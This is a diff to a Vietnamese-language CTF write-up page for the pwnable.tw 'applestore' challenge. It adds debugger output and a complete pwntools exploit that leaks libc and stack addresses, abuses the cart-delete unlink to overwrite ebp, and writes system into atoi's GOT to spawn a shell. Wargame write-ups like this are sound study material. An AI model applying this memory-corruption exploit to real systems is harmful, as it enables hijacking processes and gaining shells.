@@ -164,9 +164,10 @@
                 <div id="content" class="content">
                     <main>
                         <h1 id="applestore"><a class="header" href="#applestore">applestore</a></h1>
+<p>Bài này mình thấy khá là hay luôn, mình đọc wu sml :(( đúng nghĩa mới thấm được. xin loi vi su ngungok nay</p>
 <p>Oke thì bài này mình vừa làm vừa note, vừa tham khảo: <a href="https://drx.home.blog/2019/04/16/pwnable-tw-applestore/">1</a> và <a href="https://blog.srikavin.me/posts/pwnable-tw-applestore/">2</a></p>
 <p>soure thì mở ida lên đọc nhea, do thời gian cấp bách sắp test nên mình sẽ làm nhanh gọn lẹ vào vấn đề chính note lúc giải. </p>
-<p>Mình thấy 1 bug ở chỗ sau khi pass được checkout và có ip8 với giá 1$ thì khi ta remote nó sẽ gặp trường hợp sau:</p>
+<p>Mình thấy 1 bug ở chỗ sau khi pass được checkout và có ip8 với giá 1$ thì khi ta delete nó sẽ gặp trường hợp sau:</p>
 <pre><code class="language-shell">
 Item Number&gt; $ 27
 Remove 27:f\x90f\x90f\x90VS\x83\xec\x8b\$\x10e\xa1\x0c from your shopping cart.
@@ -226,6 +227,137 @@ log.info(&quot;binsh: &quot; + hex(bin_sh))
 r.interactive()
 
 </code></pre>
+<p>Oke sau khi leak libc thì ta sẽ leak tiếp stack tính ebp, mình nói cách thức trc, còn lý do thì để đi exploit hết rồi nói tiếp</p>
+<p>Ở đây sẽ leak environ, rồi dựa vào offset so với ebp =&gt; ebp address</p>
+<pre><code class="language-shell">với libc.sym['environ'] 
+ta có [*] environ ??? : 0xf7f6adbc
+
+pwndbg&gt; x 0xf7f6adbc
+0xf7f6adbc &lt;environ&gt;:	0xffd9316c
+
+53:014c│     0xffd9316c —▸ 0xffd950e1 ◂— 'SHELL=/bin/bash'
+
+
+pwndbg&gt; print $ebp
+$1 = (void *) 0xffd93068
+pwndbg&gt; p 0xffd9316c - 0xffd93068
+$2 = 260 (= 0x104)
+
+</code></pre>
+<p>đây là ebp của stack frame hàm delete, leak để làm gì thì sau rồi tính tiếp.</p>
+<pre><code class="language-shell">log.info(&quot;environ ??? : &quot; + hex(libc.sym['environ']))
+
+
+payload = b'27' + p32(libc.sym['environ']) #+ p32(0)*3
+r.sendlineafter('&gt; ', '3')
+r.sendlineafter(b'&gt; ', payload  )
+
+leak_environ_addr = r.recvline().split(b&quot; from&quot;)[0].split(b&quot;27:&quot;)[1]
+
+log.info(&quot;environ addr: &quot; + hex(u32(leak_environ_addr)))
+ebp_addr_delete = u32(leak_environ_addr) - 0x104
+
+log.info(&quot;ebp addr delete stack frame addr: &quot; + hex(ebp_addr_delete))
+
+
+</code></pre>
+<p>thì giờ mình đã biết lý do vì sau phải leak ebp. </p>
+<pre><code class="language-shell"> v4 = *(v2 + 8);                // ebp - 0xc
+      v5 = *(v2 + 12);          // got atoi() + 0x22
+      if ( v5 )
+        *(v5 + 8) = v4;         // got atoi() + 0x1a =  ebp - 0xc
+      if ( v4 )
+        *(v4 + 12) = v5;        // ebp = got atoi() + 0x22
+</code></pre>
+<p>lý do mà ebp = got + 0x22 là do, sau khi từ hàm delete trở về handler thì ta nhận thấy con trỏ nptr ta nhập vào với read, nó đang nằm ở ebp - 0x22, nên để pass -0x22 và ghi vào địa chỉ got của atoi địa chỉ hàm system thì yah. </p>
+<h3 id="exploit"><a class="header" href="#exploit">exploit</a></h3>
+<pre><code class="language-python">from pwn import *
+
+binary = context.binary = ELF(&quot;./applestore_patched&quot;)
+libc = ELF(&quot;./libc_32.so.6&quot;)
+
+
+if args.REMOTE:
+    r = remote(&quot;chall.pwnable.tw&quot;, 10104)
+else:
+    r = process(binary.path)
+    #gdb.attach(r, api=True)
+
+payload = b&quot;&quot;
+
+def Add(item):
+    r.sendlineafter(b'&gt; ', b'2')
+    r.sendlineafter(b'&gt; ', item)
+
+for i in range(20):
+    Add(b'2')
+for i in range(6):
+    Add(b'1')
+
+r.sendlineafter(b'&gt; ', b'5')
+
+log.info(&quot;Atoi got: &quot; + hex(binary.got['atoi']))
+r.sendlineafter(b'ok? (y/n) &gt; ', b'y')
+
+
+payload = b'27' + p32(binary.got['atoi']) #+ p32(0)*3
+r.sendlineafter(b'&gt; ', b'3')
+r.sendlineafter(b'&gt; ', payload  )
+leak_atoi_runtime_addr = r.recvline().split(b&quot; from&quot;)[0].split(b&quot;27:&quot;)[1]
+
+atoi_offset = libc.symbols['atoi']
+log.info(&quot;offset atoi: &quot; + hex(atoi_offset))
+libc.address = u32(leak_atoi_runtime_addr) - atoi_offset
+log.info(&quot;Libc base: &quot; + hex(libc.address))
+
+bin_sh = next(libc.search(b'/bin/sh\x00'))
+system = libc.symbols['system']
+log.info(&quot;system: &quot; + hex(system))
+log.info(&quot;binsh: &quot; + hex(bin_sh))
+
+####################################################
+
+log.info(&quot;environ ??? : &quot; + hex(libc.sym['environ']))
+payload = b'27' + p32(libc.sym['environ']) #+ p32(0)*3
+r.sendlineafter(b'&gt; ', b'3')
+r.sendlineafter(b'&gt; ', payload  )
+
+leak_environ_addr = r.recvline().split(b&quot; from&quot;)[0].split(b&quot;27:&quot;)[1]
+
+log.info(&quot;environ addr: &quot; + hex(u32(leak_environ_addr)))
+ebp_addr_delete = u32(leak_environ_addr) - 0x104
+
+log.info(&quot;ebp addr delete stack frame: &quot; + hex(ebp_addr_delete))
+
+####################################################
+
+payload = b'27' + p32(0)*2  + p32(ebp_addr_delete - 0xc) + p32(binary.got['atoi'] + 0x22)
+r.sendlineafter(b'&gt; ', b'3')
+r.sendlineafter(b'&gt; ', payload  )
+log.info(&quot;atoi got(): &quot; + hex(binary.got['atoi']))
+
+
+payload =  p32(system)  + b&quot;;id;sh;&quot;
+r.sendafter(b'&gt; ', payload  )
+
+
+r.interactive()
+
+
+</code></pre>
+<p>còn lý do tại sao &quot;;sh&quot; là do trước đó nó còn cái quái gì ấy nên phải làm thế để pass qua mớ dư thừa phía trước.</p>
+<p>Bài này mình thấy hay ở chỗ:</p>
+<ul>
+<li>thứ quan trọng lại k lưu luôn vào heap. mà lại để trên stack</li>
+<li>thêm nữa các stack nó liền kề nhau tuy nhiên <strong>item number</strong> lại cho nhập tận 22 bytes, =&gt; overwrite mất các stack phía trên. </li>
+<li>việc delete() bằng cách thay đổi con trỏ, hmmm maybe nó là tính năng như bị thay đổi tác dụng kể từ khi thg quan trọng lại nằm trên stack.</li>
+</ul>
+<p>Các bước khai thác :</p>
+<ul>
+<li>leak libc với printf %s</li>
+<li>leak stack eviron =&gt; ebp addr</li>
+<li>lợi dụng delete bằng cách thay đổi con trỏ để =&gt; thay đổi old ebp =&gt; read vào địa chỉ got của 1 hàm, thay đổi nó. </li>
+</ul>
 
                     </main>
 
